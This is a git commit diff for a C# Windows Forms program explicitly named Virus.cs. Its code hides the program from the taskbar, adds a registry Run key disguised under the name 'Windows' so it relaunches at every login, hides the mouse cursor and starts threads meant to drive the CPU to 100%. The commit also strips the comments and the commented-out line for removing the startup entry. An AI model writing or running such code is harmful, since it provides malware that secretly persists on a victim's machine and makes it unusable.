f1560e946f9434798dc444fc02d41f81bc9f4019
O_Riley <86636387+Randumbdude@users.noreply.github.com>
2022-11-28 21:24:43 -0600

    Update and rename Form1.cs to Virus.cs

--- Virus.cs
+++ Virus.cs
@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using System.Threading;
@@ -11,19 +11,14 @@ namespace Virus
         {
             InitializeComponent();
         }
-
         private void Form1_Load(object sender, EventArgs e)
         {
-            //setting program to not show in taskbar
             this.ShowInTaskbar = false;
-            //setting program to run on startup
             RegistryKey rk = Registry.CurrentUser.OpenSubKey
-            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); //Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             rk.SetValue("Windows", Application.ExecutablePath);
-            //hiding cursor & minimizing window
             Cursor.Hide();
             this.WindowState = FormWindowState.Minimized;
-            //100% cpu
             for (int i = 0; i < 10; i++)
             {
                 ThreadPool.QueueUserWorkItem(new WaitCallback((a) =>
@@ -35,6 +30,3 @@ namespace Virus
         }
     }
 }
-
-//remove auto startup
-//rk.DeleteValue("Windows", false);
